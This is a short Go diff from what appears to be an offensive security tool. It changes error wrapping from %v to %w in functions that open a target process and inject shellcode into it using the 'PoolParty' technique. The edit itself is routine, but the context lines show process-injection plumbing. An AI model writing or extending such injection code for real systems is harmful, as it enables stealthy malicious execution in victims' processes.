@@ -140,7 +140,7 @@ func poolPartyInit(variant int, desc string, shellcode []byte, pid uint32) (uint
 
 	hProcess, err := injectOpenProcess(poolPartyProcessAccess, pid)
 	if err != nil {
-		return 0, output, fmt.Errorf("OpenProcess failed: %v", err)
+		return 0, output, fmt.Errorf("OpenProcess failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
 	return hProcess, output, nil
@@ -151,7 +151,7 @@ func poolPartyInit(variant int, desc string, shellcode []byte, pid uint32) (uint
 func poolPartyAllocShellcode(hProcess uintptr, shellcode []byte, output string) (uintptr, string, error) {
 	addr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
-		return 0, output, fmt.Errorf("shellcode injection failed: %v", err)
+		return 0, output, fmt.Errorf("shellcode injection failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", addr)
 	return addr, output, nil
